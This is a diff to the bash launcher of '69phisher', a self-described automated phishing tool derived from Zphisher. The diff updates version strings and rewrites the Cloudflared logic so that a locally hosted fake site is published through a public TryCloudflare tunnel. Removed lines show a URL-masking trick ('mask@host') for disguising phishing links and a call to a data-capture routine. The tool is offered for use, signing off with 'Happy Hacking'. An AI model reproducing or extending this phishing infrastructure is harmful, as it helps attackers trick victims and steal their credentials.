@@ -3,7 +3,7 @@
 
 ##   69phisher 	: 	Automated Phishing Tool
 ##   Author 	: 	Akshay 
-##   Version 	: 	1.2
+##   Version 	: 	1.5-official
 ##   Github 	: 	https://github.com/Akshay-Arjun
 ## Modified version of :
 ##   Zphisher 	: 	Automated Phishing Tool
@@ -33,18 +33,31 @@ if [[ -d ".server/www" ]]; then
 else
 	mkdir -p ".server/www"
 fi
-if [[ -e ".cld.log" ]]; then
-	rm -rf ".cld.log"
+
+## Remove config.yaml if it exists in .cloudflared (TryCloudflare requirement)
+if [[ -d "$HOME/.cloudflared" ]]; then
+	if [[ -f "$HOME/.cloudflared/config.yaml" ]]; then
+		echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Found config.yaml in .cloudflared - renaming temporarily for TryCloudflare"
+		mv "$HOME/.cloudflared/config.yaml" "$HOME/.cloudflared/config.yaml.backup" 2>/dev/null
+	fi
 fi
 
 ## Script termination
 exit_on_signal_SIGINT() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Interrupted." 2>&1; reset_color; }
+    # Restore config if it was backed up
+    if [[ -f "$HOME/.cloudflared/config.yaml.backup" ]]; then
+    	mv "$HOME/.cloudflared/config.yaml.backup" "$HOME/.cloudflared/config.yaml" 2>/dev/null
+    fi
     exit 0
 }
 
 exit_on_signal_SIGTERM() {
     { printf "\n\n%s\n\n" "${RED}[${WHITE}!${RED}]${RED} Program Terminated. Thank you for using & Happy Hacking" 2>&1; reset_color; }
+    # Restore config if it was backed up
+    if [[ -f "$HOME/.cloudflared/config.yaml.backup" ]]; then
+    	mv "$HOME/.cloudflared/config.yaml.backup" "$HOME/.cloudflared/config.yaml" 2>/dev/null
+    fi
     exit 0
 }
 
@@ -80,8 +93,8 @@ ${ORANGE}| '_ \  \__, || '_ \ | '_ \ | |/ __|| '_ \  / _ \| '__|
 ${ORANGE}| (_) |   / / | |_) || | | || |\__ \| | | ||  __/| |   	
 ${ORANGE} \___/   /_/  | .__/ |_| |_||_||___/|_| |_| \___||_|   
 ${ORANGE}              | |                                      
-${ORANGE}              |_|   ${RED}Version : 1.2
-              
+${ORANGE}              |_|   ${RED}Version : 1.5
+               
 
 ${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Akshay-Arjun ${WHITE}
 EOF
@@ -96,7 +109,7 @@ banner_small() {
 			/,    /`               \  __  / 
 			\\"--\\                (_/ (_/  		
 		
-		Version : 1.2
+		Version : 1.5
 	EOF
 }
 
@@ -168,13 +181,13 @@ install_cloudflared() {
 		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
 		arch=`uname -m`
 		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
 		elif [[ "$arch" == *'aarch64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
 		elif [[ "$arch" == *'x86_64'* ]]; then
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
 		else
-			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
+			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
 		fi
 	fi
 }
@@ -183,6 +196,10 @@ install_cloudflared() {
 msg_exit() {
 	{ clear; banner; echo; }
 	echo -e "${GREENBG}${BLACK} Happy Hacking.${RESETBG}\n"
+	# Restore config if it was backed up
+	if [[ -f "$HOME/.cloudflared/config.yaml.backup" ]]; then
+		mv "$HOME/.cloudflared/config.yaml.backup" "$HOME/.cloudflared/config.yaml" 2>/dev/null
+	fi
 	{ reset_color; exit 0; }
 }
 
@@ -193,7 +210,7 @@ about() {
 		${GREEN}Author   ${RED}:  ${ORANGE}Akshay Arjun
 		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/Akshay-Arjun
 		${GREEN}Social   ${RED}:  ${CYAN}https://bit.ly/AKSHAYARJUN
-		${GREEN}Version  ${RED}:  ${ORANGE}1.0
+		${GREEN}Version  ${RED}:  ${ORANGE}1.5
 
 		${REDBG}${WHITE} Thanks : htr-tech,Adi1090x,MoisesTapia,ThelinuxChoice
 								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
@@ -276,27 +293,28 @@ capture_data() {
 ## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
 ## Credits HTR-TECH
 
-## Start Cloudflared
+## Start Cloudflared using official TryCloudflare method
+## https://developers.cloudflare.com/cloudflare-one/networks/connectors/cloudflare-tunnel/do-more-with-tunnels/trycloudflare/
 start_cloudflared() { 
-        rm .cld.log > /dev/null 2>&1 &
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}https://$HOST:$PORT ${GREEN})"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
-	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
+	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared TryCloudflare tunnel..."
 
-    if [[ `command -v termux-chroot` ]]; then
-		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
-    else
-        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
-    fi
+	# Check if cloudflared exists and is executable
+	if [[ ! -x "./.server/cloudflared" ]]; then
+		echo -e "\n${RED}[${WHITE}!${RED}]${RED} ERROR: Cloudflared binary not found or not executable"
+		{ reset_color; exit 1; }
+	fi
 
-	{ sleep 8; clear; banner_small; }
+	# Start cloudflared tunnel using official TryCloudflare method
+	# Command: cloudflared tunnel --url http://localhost:8080
+	# Output will contain: https://randomstring.trycloudflare.com
 	
-	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
-	cldflr_link1=${cldflr_link#https://}
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$cldflr_link"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$cldflr_link1"
-	echo -e "\n If you are getting Argo Tunnel Error in the above links,please wait atleast 1 minute for the site to come alive."
-	capture_data
+	echo -e "\n${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Cloudflared will print tunnel URL below:"
+	echo -e "${ORANGE}[${WHITE}*${ORANGE}]${CYAN} Look for line containing 'trycloudflare.com'${WHITE}\n"
+	
+	# Run cloudflared tunnel - this will output the URL to stdout
+	./.server/cloudflared tunnel --url "http://$HOST:$PORT"
 }
 
 
@@ -308,7 +326,7 @@ tunnel_menu() {
 
 	EOF
 
-	echo "${RED}[${WHITE}-${RED}]${GREEN} Starting port forwarding by Cloudflared${BLUE}"
+	echo "${RED}[${WHITE}-${RED}]${GREEN} Starting TryCloudflare tunnel via Cloudflared${BLUE}"
 	start_cloudflared
 	
 	
